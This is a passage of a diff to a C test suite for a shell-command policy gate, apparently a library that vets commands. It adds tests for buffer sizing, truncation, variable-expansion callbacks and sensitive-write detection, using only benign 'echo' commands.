+    ASSERT(sg_gate_evaluate(gate, source, source_length, buffer, hint,
+                            &result) == SG_ERR_MEMORY);
+    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && !result.truncated &&
+           result.unresolved_expansion_flags == 0 &&
+           sg_gate_anomaly_vocab_size(gate) == vocabulary);
+    ASSERT(contract.valid && contract.calls == calls + 1);
+
+    /* One byte short of the reservation (plus a nonempty result prefix) is a
+     * workspace failure; the exact reservation leaves only a truncated
+     * diagnostic, and the ordinary allowance then completes evaluation. */
+    size_t alignment = shell_dep_workspace_alignment();
+    size_t fixed_workspace = sg_test_eval_workspace_size(source_length);
+    size_t minimal = fixed_workspace + extension + alignment;
+    ASSERT(sg_gate_evaluate(gate, source, source_length, buffer,
+                            minimal - alignment, &result) == SG_ERR_MEMORY);
+    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
+           sg_gate_anomaly_vocab_size(gate) == vocabulary);
+    ASSERT(sg_gate_evaluate(gate, source, source_length, buffer, minimal,
+                            &result) == SG_ERR_TRUNC);
+    ASSERT(result.truncated && result.verdict == SG_VERDICT_UNDETERMINED &&
+           sg_gate_anomaly_vocab_size(gate) == vocabulary);
+
+    ASSERT_SG_OK(sg_gate_evaluate(gate, source, source_length, buffer,
+                                  buffer_size, &result));
+    ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.truncated &&
+           result.subcommand_count == 3 &&
+           result.subcommands[2].write_count == 1 &&
+           result.unresolved_expansion_flags == 0 &&
+           (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
+    size_t prefix =
+        sg_test_eval_prefix_size(buffer, buffer_size, source_length) -
+        extension;
+    for (uint32_t i = 0; i < result.subcommand_count; i++) {
+      ASSERT((size_t)(result.subcommands[i].netargv - buffer) +
+                 result.subcommands[i].netargv_length <
+             prefix);
+      ASSERT((size_t)(result.subcommands[i].display_command - buffer) +
+                 strlen(result.subcommands[i].display_command) <
+             prefix);
+    }
+    ASSERT(result.violation_count != 0);
+    for (uint32_t i = 0; i < result.violation_count; i++) {
+      ASSERT((size_t)(result.violations[i].description - buffer) +
+                 strlen(result.violations[i].description) <
+             prefix);
+      ASSERT((size_t)(result.violations[i].detail - buffer) +
+                 strlen(result.violations[i].detail) <
+             prefix);
+    }
+    memset(buffer + prefix, 0x5a, buffer_size - prefix);
+    for (uint32_t i = 0; i < result.subcommand_count; i++) {
+      ASSERT_STR(result.subcommands[i].netargv, "4:echo,");
+      ASSERT_STR(result.subcommands[i].display_command, "echo");
+    }
+    ASSERT(contract.valid && contract.calls == calls + 4);
+    sg_result_t reference_result = {0};
+    ASSERT_SG_OK(sg_gate_evaluate(reference, source, source_length, buffer,
+                                  buffer_size, &reference_result));
+    ASSERT(result.anomaly_update == reference_result.anomaly_update &&
+           result.anomaly_detected == reference_result.anomaly_detected &&
+           result.anomaly_score == reference_result.anomaly_score &&
+           result.anomaly_score_raw == reference_result.anomaly_score_raw &&
+           result.anomaly_score_type == reference_result.anomaly_score_type &&
+           sg_gate_anomaly_vocab_size(gate) ==
+               sg_gate_anomaly_vocab_size(reference));
+  }
+  /* A path-workspace failure precedes rendering every command. Preserve argv
+   * uncertainty in another retained owner despite this operational failure. */
+  expansion_rule_t uncertainty_rules[] = {
+      {"\"$OUT\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED, records,
+       0},
+      {"\"$DATA\"", SG_EXPAND_WORD_ARGUMENT, SG_EXPAND_UNRESOLVED, NULL, 0},
+  };
+  expansion_contract_t uncertainty = {
+      .rules = uncertainty_rules, .rule_count = 2, .valid = true};
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_by_source_word,
+                                               &uncertainty));
+  static const char uncertain_source[] = "echo \"$DATA\"; echo >\"$OUT\"";
+  size_t uncertain_hint =
+      sg_gate_evaluate_size_hint(sizeof(uncertain_source) - 1);
+  ASSERT(uncertain_hint <= buffer_size);
+  sg_result_t uncertain_result = {0};
+  ASSERT(sg_gate_evaluate(gate, uncertain_source, sizeof(uncertain_source) - 1,
+                          buffer, uncertain_hint,
+                          &uncertain_result) == SG_ERR_MEMORY);
+  ASSERT(uncertainty.valid && uncertainty.calls == 2 &&
+         uncertain_result.verdict == SG_VERDICT_UNDETERMINED &&
+         !uncertain_result.truncated &&
+         uncertain_result.subcommand_count == 0 &&
+         uncertain_result.unresolved_expansion_flags ==
+             SG_EXPANSION_UNRESOLVED_ARGV);
+  sg_gate_free(reference);
+  sg_gate_free(gate);
+  free(buffer);
+  free(records);
+}
+
+TEST(resolved_path_identity_pool_capacity) {
+  static const char source[] = "echo >\"$A\" >\"$B\" >\"$C\"";
+  size_t source_length = sizeof(source) - 1;
+  size_t hint = sg_gate_evaluate_size_hint(source_length);
+  size_t path_length = hint / 3 + 1024;
+  size_t stride = path_length + 32;
+  char *records = malloc(3 * stride);
+  ASSERT(records != NULL);
+  expansion_rule_t rules[] = {
+      {"\"$A\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED, records, 0},
+      {"\"$B\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+       records + stride, 0},
+      {"\"$C\"", SG_EXPAND_WORD_REDIRECT_PATH, SG_EXPAND_RESOLVED,
+       records + 2 * stride, 0},
+  };
+  for (size_t i = 0; i < 3; i++) {
+    char *record = records + i * stride;
+    int header = snprintf(record, 32, "%zu:", path_length);
+    ASSERT(header > 0 && header < 32);
+    char *path = record + header;
+    path[0] = '/';
+    memset(path + 1, 'a' + (int)i, path_length - 1);
+    path[path_length] = ',';
+    path[path_length + 1] = 0;
+  }
+  expansion_contract_t contract = {
+      .rules = rules, .rule_count = 3, .valid = true};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo"));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, expand_by_source_word, &contract));
+  size_t size = hint + 7 * path_length +
+                2 * (source_length + SHELL_DEP_CWD_BUF_SIZE + 1u) + 512;
+  char *buffer = malloc(size);
+  ASSERT(buffer != NULL);
+  sg_result_t result = {0};
+  /* Without violation analysis, borrowed redirect values do not consume
+   * identity storage and cannot force an otherwise unnecessary reservation. */
+  ASSERT_SG_OK(
+      sg_gate_evaluate(gate, source, source_length, buffer, hint, &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && contract.calls == 3);
+  sg_violation_config_t config;
+  sg_violation_config_default(&config);
+  config.sensitive_write_paths[0] = "/";
+  config.sensitive_write_path_count = 1;
+  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
+  ASSERT(sg_gate_evaluate(gate, source, source_length, buffer, hint, &result) ==
+         SG_ERR_MEMORY);
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED && !result.truncated &&
+         contract.calls == 6);
+  ASSERT_SG_OK(
+      sg_gate_evaluate(gate, source, source_length, buffer, size, &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && !result.truncated &&
+         result.subcommand_count == 1 &&
+         result.subcommands[0].write_count == 3 &&
+         (result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE) &&
+         result.unresolved_expansion_flags == 0 && contract.valid &&
+         contract.calls == 9);
+  for (size_t i = 0; i < 3; i++)
+    ASSERT(rules[i].calls == 3);
+  sg_gate_free(gate);
+  free(buffer);
+  free(records);
+}
+
+static sg_expand_status_t expand_failed(const sg_expand_word_request_t *request,
                                         const char **netargv, size_t *length,
                                         void *ctx) {
-  (void)name;
-  (void)name_length;
+  (void)request;
   (void)netargv;
   (void)length;
   (void)ctx;
@@ -6740,8 +8966,8 @@ TEST(expansion_bounds_matrix) {
   sg_gate_t *expanded = sg_gate_new();
   ASSERT(expanded != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(expanded, "echo *"));
-  ASSERT_SG_OK(
-      sg_gate_set_expand_var_netargv(expanded, expand_requested_length, &view));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(expanded,
+                                               expand_requested_length, &view));
   ASSERT_SG_OK(eval_cmd(expanded, "echo $VALUE", &result));
   ASSERT(!result.truncated);
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
@@ -6754,8 +8980,7 @@ TEST(expansion_bounds_matrix) {
   sg_gate_t *gate = sg_gate_new();
   ASSERT(gate != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, NULL, NULL));
-  ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(gate, NULL, NULL));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
   char long_glob[320];
   memcpy(long_glob, "echo ", 5);
   memset(long_glob + 5, '*', 300);
@@ -6809,7 +9034,7 @@ TEST(truncation_cross_product_matrix) {
              result.verdict != SG_VERDICT_ALLOW_CONDITIONAL);
   }
 
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, expand_failed, NULL));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, expand_failed, NULL));
   sg_result_t result;
   ASSERT(eval_with_prefix(gate, "echo $VALUE", 4096, &result) == SG_ERR_EXPAND);
   ASSERT(!result.truncated && result.verdict == SG_VERDICT_UNDETERMINED);
@@ -6823,7 +9048,7 @@ TEST(truncation_cross_product_matrix) {
     ASSERT(written > 0 && (size_t)written < sizeof(many_writes) - used);
     used += (size_t)written;
   }
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, NULL, NULL));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, NULL, NULL));
   ASSERT(eval_with_prefix(gate, many_writes, 4096, &result) == SG_OK);
   ASSERT(!result.truncated);
   ASSERT(result.violation_truncated);
@@ -7757,7 +9982,9 @@ TEST(graph_analysis_scaling) {
               count, eval_status);
     ASSERT(eval_status == SG_OK);
     size_t work =
-        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EDGES);
+        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EDGES) +
+        shellsplit_test_metadata_work(
+            SHELLSPLIT_TEST_WORK_GATE_VIOLATION_INDEX);
     ASSERT(work > 0 && work <= 256 * count &&
            (!previous_work || work <= (5 * previous_work) / 2));
     ASSERT(result.subcommand_count == 2 * count);
@@ -7789,7 +10016,9 @@ TEST(graph_analysis_scaling) {
     sg_error_t eval_status = eval_cmd(gate, command, &result);
     ASSERT(eval_status == SG_OK);
     size_t work =
-        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EDGES);
+        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EDGES) +
+        shellsplit_test_metadata_work(
+            SHELLSPLIT_TEST_WORK_GATE_VIOLATION_INDEX);
     ASSERT(work > 0 && work <= 256 * count &&
            (!previous_work || work <= 3 * previous_work));
     ASSERT(result.subcommand_count == 2 * count);
@@ -11784,6 +14013,7 @@ int main(void) {
   RUN(policy_persistence_matrix);
 
   printf("\nBuffer management:\n");
+  RUN(eval_workspace_prefix_boundaries);
   RUN(buffer_contract_matrix);
   RUN(graph_result_fields_stay_out_of_workspace);
   RUN(final_diagnostic_truncation_fails_closed);
@@ -11792,7 +14022,37 @@ int main(void) {
   printf("\nExpansion callbacks:\n");
   RUN(expansion_callback_matrix);
   RUN(expansion_query_semantics);
+  RUN(expansion_rejection_precedes_callback);
   RUN(binary_expansion_callback_contract);
+  RUN(expansion_error_diagnostic_boundaries);
+  RUN(whole_word_expansion_context_contract);
+  RUN(assignment_tilde_expansion_contract);
+  RUN(tilde_path_identity_expansion_contract);
+  RUN(tilde_cwd_expansion_contract);
+  RUN(resolved_argument_violation_equivalence);
+  RUN(resolved_argument_binary_and_fallback_contract);
+  RUN(resolved_substitution_argument_file_relations);
+  RUN(resolved_filename_substitution_consumer_contract);
+  RUN(resolved_arguments_linear_work);
+  RUN(expansion_operand_eligibility_contract);
+  RUN(printf_expansion_control_contract);
+  RUN(expansion_unresolved_flags_contract);
+  RUN(expansion_flags_stop_modes);
+  RUN(expansion_flags_precede_output_failures);
+  RUN(expansion_flags_resolved_values);
+  RUN(expansion_flags_linear_metadata);
+  RUN(nested_path_expansion_ownership);
+  RUN(nested_path_expansion_stop_and_truncation);
+  RUN(nested_path_expansion_linear_metadata);
+  RUN(expansion_path_failure_and_reachability_contract);
+  RUN(resolved_named_redirect_failure_effects);
+  RUN(empty_path_static_resolved_equivalence);
+  RUN(static_empty_path_callback_reachability);
+  RUN(resolved_path_workspace_capacity_and_retry);
+  RUN(resolved_path_identity_pool_capacity);
+  RUN(substitution_status_callback_reachability);
+  RUN(resolved_file_violation_details);
+  RUN(file_substitution_path_failure_is_local);
   RUN(expansion_bounds_matrix);
   RUN(truncation_cross_product_matrix);
 
